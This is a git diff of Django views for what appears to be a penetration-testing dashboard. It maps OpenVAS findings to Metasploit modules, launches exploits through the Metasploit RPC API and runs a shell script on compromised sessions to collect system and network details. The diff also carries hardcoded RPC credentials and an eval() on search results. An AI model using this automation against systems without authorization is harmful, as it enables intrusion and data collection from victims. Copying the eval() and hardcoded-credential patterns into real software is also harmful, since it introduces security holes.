@@ -1,3 +1,5 @@
+from nltk.corpus import stopwords
+import GVM.GVM.gvm as gvm
 import json
 import random
 import re
@@ -10,29 +12,40 @@ from django.template import loader
 from django.http import HttpResponse, JsonResponse, HttpResponseRedirect
 from django import template
 from pymetasploit3.msfrpc import MsfRpcClient
+import xml.etree.ElementTree as ET
 import time
 import threading
-
+import re
+from collections import Counter
 from Users.models import User
 from .models import Exploit
+from collections import Counter
+from nltk.tokenize import word_tokenize
+import nltk
+from nltk.corpus import stopwords
+import re
 
+# stop_words = set(stopwords.words('english'))
 msf_user = 'msf'
 msf_pass = 'msf'
 msf_host = '127.0.0.1'
 msf_port = 55552
 # Khởi tạo đối tượng MsfRpcClient
-client = MsfRpcClient(msf_pass, port=msf_port, username=msf_user, server=msf_host)
+client = MsfRpcClient(msf_pass, port=msf_port,
+                      username=msf_user, server=msf_host)
 
-host = "127.0.0.1:8888"
+host = ""
 # Create your views here.
 
+
 def exploit(module, payload, rhost, rport, uri, lhost, lport):
-    subprocess.run(["python", "./Core/tools/send_data.py", host, "start attack"], capture_output=True, text=True)
+    subprocess.run(["python", "./Core/tools/send_data.py", host,
+                   "start attack"], capture_output=True, text=True)
     console = client.consoles.console()
     console.read()
     console.write("use " + module)
-    subprocess.run(["python", "./Core/tools/send_data.py", host, console.read()['data']], capture_output=True, text=True)
-
+    subprocess.run(["python", "./Core/tools/send_data.py", host,
+                   console.read()['data']], capture_output=True, text=True)
 
     time.sleep(2)
     console.write("set payload " + payload)
@@ -83,13 +96,49 @@ def exploit(module, payload, rhost, rport, uri, lhost, lport):
             break
 
 
+def extract_keywords(text):
+    words = nltk.word_tokenize(text)
+    stop_words = set(stopwords.words('english'))
+    keywords = [word for word in words if word.lower() not in stop_words]
+    # Thêm vào đoạn mã này để bao gồm các từ như "dRuby" và "DRb"
+    additional_keywords = re.findall(
+        r'\b(?:[a-z]+[A-Z]|[A-Z]+[a-z])[a-zA-Z0-9]*\b', text)
+    return additional_keywords
+
+
+class Auto(View):
+    def get(self, request, id1, **kwargs):
+        vuln = gvm.get_result(id=id1)
+        et = ET.fromstring(vuln).find("result")
+        name = et.find('name').text
+        host = request.get_host()
+        username = request.user.username
+
+        search_term = extract_keywords(name)
+        print(search_term)
+        search_results = []
+        for child in search_term:
+            results = client.call('module.search', [child])
+            results = [str(child) for child in results]
+            search_results.extend(results)
+        counter = Counter(list(search_results))
+        result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
+        print(result[0])
+        results = [eval(child[0]) for child in result[0:10] if child[1]==result[0][1]]
+        exploits = [child["fullname"] for child in results]
+        exploits.insert(0, '')
+        host = et.find('host').text
+        return render(request, "dashboard/auto.html", {"username": username, "exploits": exploits, 'host':host})
+
+
 class Main(View):
     def get(self, request, **kwargs):
+        host = request.get_host()
         username = request.user.username
         module = Exploit.objects.all()
-        exploits= client.modules.exploits
+        exploits = client.modules.exploits
         exploits.insert(0, '')
-        
+
         return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})
 
     def post(self, request, **kwargs):
@@ -100,7 +149,8 @@ class Main(View):
         lhost = request.POST.get('lhost', None)
         lport = request.POST.get('lport', None)
         uri = request.POST.get('uri', None)
-        threading.Thread(target=exploit(module=module, payload=payload, rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport)).start()
+        threading.Thread(target=exploit(module=module, payload=payload,
+                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport)).start()
 
         username = request.user.username
         exploits = client.modules.exploits
@@ -164,12 +214,9 @@ class LoadPayloads(View):
         return JsonResponse(payloads)
 
 
-
-
-
 class LoadSessionId(View):
 
-    system_info="""readarray -t array <<< "$(df -h)";
+    system_info = """readarray -t array <<< "$(df -h)";
 var=$(echo "${array[1]}"| grep -aob '%' | grep -oE '[0-9]+');
 df_output="${array[3]:$var-3:4}";
 
@@ -186,6 +233,7 @@ memory=$(dmidecode -t 17 | grep "Size" | awk '{s+=$2} {b=$3} END {print s b}');
 
 printf '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":"%s","hostname":"%s","operating_system":"%s","processor_name":"%s","memory":"%s"}' "$manufacturer" "$product_name" "$version" "$serial_number" "$hostname" "$operating_system" "$processor_name" "$memory"
 """
+
     def byte_to_json(self, output):
         try:
             return json.loads(output.decode('utf8'))
@@ -196,14 +244,15 @@ printf '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":
     def get(self, request, id):
         ip = client.sessions.list[str(id)]['session_host']
         network = []
-        system={}
+        system = {}
         try:
             console, data, cid = run_session(int(id))
             data = run_command(console, "ip addr")['data']
             network = re.split(r'\n[0-9]:', data)
             system = run_command(console, self.system_info)
             system = system['data'].split('\n')[-1]
-            if system=="":system="{}"
+            if system == "":
+                system = "{}"
             # console.write("background")
             # console.read()
 
@@ -225,7 +274,7 @@ printf '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":
         # get_system_network_json = self.byte_to_json(get_network_info)
         # get_systemctl_list_json = self.byte_to_json(get_systemctl)
         session = client.sessions.list[str(id)]
-        return render(request, 'client/clientinfo.html', {'id': id, 'ip': ip, 'system_network': network, 'client_info':system, 'session':session})
+        return render(request, 'client/clientinfo.html', {'id': id, 'ip': ip, 'system_network': network, 'client_info': system, 'session': session})
 
 
 class Msf(View):
@@ -237,13 +286,16 @@ class Msf(View):
 class Module(View):
     def get(self, request):
         module = request.GET['module']
-        payloads=client.modules.use('exploit', module).payloads
-        payloads ={'payloads':payloads}
+        payloads = client.modules.use('exploit', module).payloads
+        payloads = {'payloads': payloads}
         return JsonResponse(payloads)
+
 
 class Message(View):
     def get(self, request):
         return render(request, 'dashboard/message.html')
+
+
 class Meterpreter(View):
     def get(self, request, id):
         console = client.consoles.console()
@@ -255,6 +307,7 @@ class Meterpreter(View):
         time.sleep(5)
         print(console.read())
         return HttpResponseRedirect("/oprs/")
+
 
 class Info(View):
     def get(self, request, ip):
